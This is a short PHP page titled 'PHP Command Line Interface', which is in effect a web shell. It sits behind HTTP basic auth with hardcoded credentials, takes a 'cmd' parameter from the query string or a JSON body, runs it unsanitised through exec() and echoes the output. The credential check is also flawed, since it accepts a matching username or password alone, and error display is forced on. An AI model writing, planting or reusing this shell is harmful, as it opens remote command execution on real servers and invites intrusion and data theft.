<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PHP Command Line Interface</title>
    </head>
    <style>
        body {
            margin: 0;
            padding: 10px;
            background: #000;
            color: #fff;
        }
    </style>

    <body>
        <?php
        // header('')
        ini_set('display_errors', true);

        if (isset($_GET['debug']) && $_GET['debug'] == 1) {
            error_reporting(E_ALL);
            ini_set('display_errors', true);
        }
        if (!isset($_SERVER['PHP_AUTH_USER'])) {
            header('WWW-Authenticate: Basic realm="Terminal Command Realm"');
            header('HTTP/1.0 401 Unauthorized');
            echo 'User pressed Cancel';
            exit;
        } else {
            if ($_SERVER['PHP_AUTH_USER'] !== "Command" && $_SERVER['PHP_AUTH_PW'] !== "Command@2023") {
                header('WWW-Authenticate: Basic realm="Samtana Command Realm"');
                header('HTTP/1.0 401 Unauthorized');
                die('You\'ve entered wrong username or password');
            }
        }

        $jsonBody = json_decode(file_get_contents("php://input"), true);
        // print_r($jsonBody) ;
        
        if (json_last_error() === JSON_ERROR_NONE && isset($jsonBody['cmd']) && !empty(isset($jsonBody['cmd']))) {
            $_GET['cmd'] = $jsonBody['cmd'];
        }



        // print_r($_GET) ;
        


        if (isset($_GET['cmd']) && $_GET['cmd']) {

            exec("{$_GET['cmd']}", $output);
            echo "<pre>";
            foreach ($output as $o) {
                echo ($o) . "\n";
            }
            echo "</pre>";
        }
        ?>
    </body>

</html>